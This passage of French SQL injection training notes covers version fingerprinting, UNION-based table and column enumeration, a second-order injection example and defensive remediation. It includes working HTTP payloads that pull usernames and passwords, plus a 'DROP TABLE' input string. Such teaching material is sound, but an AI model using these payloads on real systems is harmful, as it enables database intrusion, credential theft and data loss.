**Une fois le SGBD identifié**, on extrait sa version précise pour rechercher d'éventuelles vulnérabilités connues (CVE) propres à cette build :

```sql
SELECT @@version;        -- SQL Server → ex: "Microsoft SQL Server 2019 (RTM) - 15.0.2000.5..."
SELECT version();        -- MySQL / PostgreSQL
SELECT * FROM v$version; -- Oracle
```

### 5.2 Énumération de la base de données

**Contexte :** on sait maintenant que la cible tourne sur MySQL, avec une injection exploitable en UNION à 3 colonnes (voir section 3.3). On ne connaît pas encore le nom exact des tables ni des colonnes sensibles — on part donc du principe qu'on ne connaît **rien** de la structure interne, et on la découvre entièrement via les métadonnées standard.

**Étape 1 — Lister toutes les tables de la base courante :**

```http
GET /produit?id=1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- HTTP/1.1
```

**Résultat attendu :** la page produit affiche une ligne par table existante — par exemple `produits`, `commandes`, `users`, `sessions`. C'est `users` qui nous intéresse.

**Étape 2 — Lister les colonnes de la table `users` repérée à l'étape 1 :**

```http
GET /produit?id=1' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
```

**Résultat attendu :** la page liste les colonnes réelles — par exemple `id`, `username`, `password`, `email`, `is_admin`. On sait maintenant précisément quoi cibler pour l'exfiltration finale (section 3.3, étape 3).

**Étape 3 — Exfiltrer les données une fois la structure connue :**

```http
GET /produit?id=1' UNION SELECT NULL, username, password FROM users-- HTTP/1.1
```

!!! note "Spécificités Oracle"
    Oracle n'utilise pas `information_schema` mais ses propres vues de métadonnées : `all_tables`, `all_tab_columns`. Les noms d'objets y sont généralement stockés et retournés en **MAJUSCULES**, donc une comparaison `WHERE table_name='users'` échouera silencieusement sur Oracle — il faut écrire `WHERE table_name='USERS'`.

---

## 6. SQLi de Second Ordre (Second-Order SQLi)

!!! warning "Principe"
    Contrairement à une injection classique exploitée immédiatement, le SQLi de second ordre exploite un décalage temporel entre le stockage d'une donnée malveillante et sa réutilisation non sécurisée dans une requête ultérieure.

**Contexte réaliste :** un site permet de changer son nom d'affichage depuis les paramètres du compte. Ce champ est **correctement paramétré** au moment de l'enregistrement — aucune injection possible ici. Mais une fonctionnalité totalement différente, la "récupération de mot de passe admin" (accessible seulement aux comptes marqués administrateurs), **relit** ce nom d'affichage plus tard et le réinjecte dans une requête construite par concaténation, sans le reparamétrer.

**Phase 1 — Stockage passif (aucune alerte, tout semble normal) :**

```http
POST /account/settings HTTP/1.1
Content-Type: application/x-www-form-urlencoded

display_name=administrator'--
```

Cette requête est traitée avec une requête préparée côté serveur :

```sql
UPDATE users SET display_name = ? WHERE id = ?;
-- Valeur '?' = "administrator'--" : stockée telle quelle, sans exécution, aucun risque à ce stade.
```

**Résultat immédiat :** rien d'anormal ne se produit. Le profil affiche simplement `administrator'--` comme nom, ce qui peut même sembler être une simple bizarrerie cosmétique.

**Phase 2 — Exécution active, des jours plus tard, via une fonctionnalité totalement différente :**

Un job interne ("mise à jour du mot de passe admin par le support") relit ce `display_name` stocké et l'utilise pour construire dynamiquement une requête, **sans paramétrage cette fois** :

```sql
-- Le code applicatif construit la requête par concaténation directe de la valeur déjà stockée
UPDATE users SET password = 'hacked123' WHERE username = 'administrator'--';
--                                                        ^ le '-- injecté en phase 1 commente
--                                                          la suite de la condition WHERE
```

**Résultat :** le mot de passe de l'administrateur est réécrit à `hacked123`, sans qu'aucune injection n'ait été visible ni détectable au moment de la soumission initiale (phase 1), puisque cette dernière était parfaitement paramétrée.

!!! danger "Difficulté de détection"
    Ce type de vulnérabilité échappe aux scanners automatisés classiques, car le point d'injection (formulaire A, phase 1) et le point d'exécution (fonctionnalité B, phase 2) sont dissociés dans le temps et dans le code. Un test isolé de la phase 1 ne révèle rien ; il faut cartographier **tous les endroits** où une donnée utilisateur stockée est ensuite relue et réutilisée dans une requête SQL dynamique.

---

## 7. Prévention & Remédiation (Blue Team)

### 7.1 Requêtes préparées / Paramétrage (Prepared Statements)

!!! tip "Bonne pratique de référence"
    La séparation stricte entre le code SQL et les données utilisateur, via des espaces réservés (placeholders), est la contre-mesure la plus robuste et la plus universellement recommandée (OWASP).

```sql
-- Requête préparée (exemple générique)
SELECT * FROM produits WHERE nom = ?;
```

**Pourquoi cette approche neutralise réellement toutes les techniques ci-dessus :** dans une requête préparée, le pilote SQL envoie au SGBD, en **deux temps distincts**, d'abord le squelette de la requête (avec son placeholder `?`), puis la valeur à substituer — sans jamais reconstruire de chaîne SQL textuelle à partir de l'entrée utilisateur. Même si l'on soumet `admin'--` comme valeur, le SGBD la traite comme une **donnée littérale** de la colonne `nom`, jamais comme du code : aucune des techniques d'injection présentées dans ce document (commentaire, UNION, tautologie, etc.) ne peut s'appliquer, car il n'y a tout simplement plus de syntaxe SQL à casser.

### 7.2 Gestion des structures dynamiques non paramétrables

!!! warning "Limite des requêtes préparées"
    Les espaces réservés (`?`) ne peuvent pas être utilisés pour :
    - les noms de tables,
    - les noms de colonnes,
    - la direction de tri dans une clause `ORDER BY` (`ASC` / `DESC`).

C'est exactement le cas vulnérable illustré en section 2.1 (tri dynamique) : on ne peut pas écrire `ORDER BY ?` et faire passer `prix` en paramètre lié — le SGBD attend un **identifiant**, pas une valeur.

**Solution recommandée — Liste blanche applicative (Whitelisting) :**

```text
Exemple de cartographie sécurisée, appliquée côté serveur AVANT toute construction de requête :
  Entrée utilisateur "date" -> colonne réelle "created_at"
  Entrée utilisateur "prix" -> colonne réelle "price_cents"
  Toute autre valeur -> rejet (HTTP 400), la requête SQL n'est même pas construite
```

Le principe : l'entrée utilisateur ne sert **jamais** directement de fragment SQL — elle sert uniquement de **clé de correspondance** vers une valeur fixe, codée en dur côté serveur, qui elle sera insérée dans la requête. Une entrée comme `prix; DROP TABLE users--` ne matchera simplement aucune entrée de la liste blanche et sera rejetée avant même d'atteindre le SGBD.

### 7.3 Synthèse des contre-mesures

| Contre-mesure | Portée | Neutralise |
|---|---|---|
| Requêtes préparées / ORM paramétré | Toutes les valeurs de données | Sections 1, 3, 4, 5 (sur les données) |
| Liste blanche (whitelisting) | Identifiants, noms de colonnes/tables, tri | Section 2.1 (structures non paramétrables) |
| Principe du moindre privilège (compte BDD applicatif) | Limitation de l'impact en cas de contournement | Réduit l'impact de la section 1.5/4.5 (OAST) et 3.3 (UNION) |
| Validation stricte des types d'entrée | Défense en profondeur | Réduit la surface de la section 1.2 |
| WAF à jour + normalisation avant filtrage | Défense en profondeur (non suffisante seule) | Ralentit mais ne bloque pas la section 2.2 |
| Journalisation et alerting sur erreurs SQL anormales | Détection précoce | Permet de détecter les tentatives des sections 1.1 et 4.2/4.3 |

!!! danger "Rappel essentiel"
    Aucune de ces contre-mesures n'est suffisante isolément. Les requêtes préparées traitent la cause racine pour les données, mais doivent être complétées par du whitelisting pour les éléments structurels et par une défense en profondeur (moindre privilège, monitoring) pour limiter l'impact en cas de régression — notamment sur le SQLi de second ordre (section 6), qui contourne le paramétrage par définition en le déplaçant vers un point de réutilisation non couvert.

---

## Synthèse de révision (Flashcard mentale)

### 1. Mécanisme de base (Cause racine)

- Une injection SQL naît d'une **confusion entre code et données** : l'application construit sa requête SQL par **concaténation de chaînes**, en insérant directement une entrée utilisateur non fiable dans le flux de commande envoyé au SGBD.
- Le SGBD n'a aucun moyen de distinguer "ce qui est la structure de la requête voulue par le développeur" de "ce qui est une donnée fournie par l'utilisateur" : tout est interprété comme une seule et même chaîne de syntaxe à exécuter.
- Dès lors qu'une entrée peut contenir des métacaractères ou mots-clés SQL (apostrophe, commentaire, opérateurs logiques, sous-requêtes) qui sont **interprétés** plutôt que traités comme du texte inerte, l'attaquant peut faire dévier la logique de la requête d'origine, l'étendre, ou en exécuter une toute autre.
- La cause racine n'est donc jamais "un mauvais filtre" mais l'**absence de séparation structurelle** entre le canal de contrôle (la requête) et le canal de données (les valeurs) — c'est cette confusion, et elle seule, que la remédiation doit éliminer.

### 2. Vecteurs & Formes d'exploitation

- **In-Band** : le résultat de l'exploitation est visible directement dans le même canal que la réponse applicative normale (contenu de la page, message d'erreur) — c'est la forme la plus rapide à exploiter car l'information est immédiatement disponible.
- **UNION-Based** : sous-catégorie In-Band où l'attaquant combine une requête arbitraire à la requête légitime pour faire apparaître des données étrangères dans le rendu habituel de l'application.
- **Error-Based** : sous-catégorie In-Band où la donnée recherchée fuit directement dans le message d'erreur technique renvoyé par le SGBD, sans itération.
- **Blind (Boolean-Based)** : l'application ne renvoie aucune donnée ni erreur exploitable, mais son comportement varie de façon binaire (contenu, redirection) selon la véracité d'une condition injectée — l'information est déduite par déduction logique, caractère par caractère.
- **Blind (erreurs conditionnelles)** : variante du Blind où le signal binaire n'est plus le contenu mais le déclenchement (ou non) d'une exception SQL, observable via le code de statut HTTP.
- **Time-Based** : variante du Blind utilisée quand même le comportement de l'application ne varie jamais visiblement ; le signal devient alors un délai de traitement artificiellement introduit et conditionné à la véracité d'un test.
- **Out-of-Band (OAST)** : forme utilisée quand aucun canal de réponse (contenu, erreur, délai) n'est exploitable ; l'attaquant force le SGBD lui-même à initier une connexion sortante vers une infrastructure qu'il contrôle, faisant du SGBD le vecteur de sa propre exfiltration.
- **Second-Order** : forme où l'injection n'est pas exploitée au moment de la soumission (qui peut être parfaitement sécurisée) mais lors d'une réutilisation ultérieure, non sécurisée, de la donnée déjà stockée dans une autre fonctionnalité.

### 3. Workflow de diagnostic (Arbre de décision)

1. **Casser la syntaxe** avec un caractère spécial de terminaison de chaîne → si une erreur SQL brute apparaît, la vulnérabilité est confirmée et potentiellement exploitable en In-Band/Error-Based.
2. Si l'erreur est masquée (page générique, code 500 sans détail) → **comparer le comportement de l'application entre une condition logiquement vraie et une condition logiquement fausse** sur le contenu renvoyé → une divergence confirme un Blind Boolean-Based.
3. Si le contenu ne varie jamais → **observer si le code de statut HTTP varie** selon la véracité d'une condition conçue pour déclencher une exception uniquement si vraie → confirme des erreurs conditionnelles exploitables.
4. Si ni le contenu ni le statut ne varient → **mesurer le temps de réponse** en conditionnant un délai artificiel à la véracité d'un test → un délai reproductible et proportionnel confirme un Time-Based Blind.
5. Si un filtre ou pare-feu applicatif semble bloquer les tentatives → **tester des variantes syntaxiques équivalentes** (casse, encodage, formulation alternative) avant de conclure à une protection réellement efficace.
6. Si aucun signal n'est exploitable par aucun des canaux précédents → **tester une interaction sortante vers une infrastructure contrôlée par l'auditeur** ; la réception de cette interaction constitue la seule preuve possible d'exécution dans un contexte totalement aveugle.
7. À chaque étape, **toujours valider par un couple de tests opposés** (une condition vraie ET une condition fausse) avant de conclure : un signal isolé peut être un faux positif dû à un autre comportement applicatif.
8. Ne jamais conclure à une absence de vulnérabilité sur la seule base d'un test négatif à une étape : chaque étape ne teste qu'une forme d'exploitation particulière, pas l'absence de la faille elle-même.

### 4. Remédiation & Sécurisation

- **Requêtes préparées / paramétrage systématique** : seule contre-mesure qui traite la cause racine, car elle supprime physiquement la possibilité pour une donnée d'être interprétée comme du code — le SGBD reçoit la structure de la requête et les valeurs par deux canaux distincts, jamais reconstruits en une seule chaîne.
- **Liste blanche stricte (whitelisting)** pour tout élément structurel qui ne peut pas être paramétré nativement (noms de tables, de colonnes, direction de tri) : l'entrée utilisateur ne sert jamais de fragment de requête, uniquement de clé vers une valeur fixe définie côté serveur.
- **Principe du moindre privilège** appliqué au compte de connexion applicatif à la base de données, afin de limiter l'impact d'une éventuelle régression future (pas d'accès en écriture si non nécessaire, pas de privilèges d'exécution de fonctions système).
- **Désactivation de l'affichage des erreurs techniques brutes** en environnement de production, pour ne pas offrir de canal d'exfiltration direct même en cas de faille résiduelle.
- **Validation stricte des types et formats d'entrée** en complément, jamais en remplacement du paramétrage — une défense en profondeur, pas une solution à elle seule.
- **Cartographie des points de réutilisation de données stockées** dans le code applicatif, pour s'assurer qu'aucune donnée déjà en base n'est réinjectée plus tard dans une requête construite par concaténation (couvre le cas du Second-Order).
- **Revue de code et tests de sécurité automatisés (SAST/DAST)** intégrés au cycle de développement, pour détecter la construction dynamique de requêtes SQL avant la mise en production plutôt qu'après un audit externe.
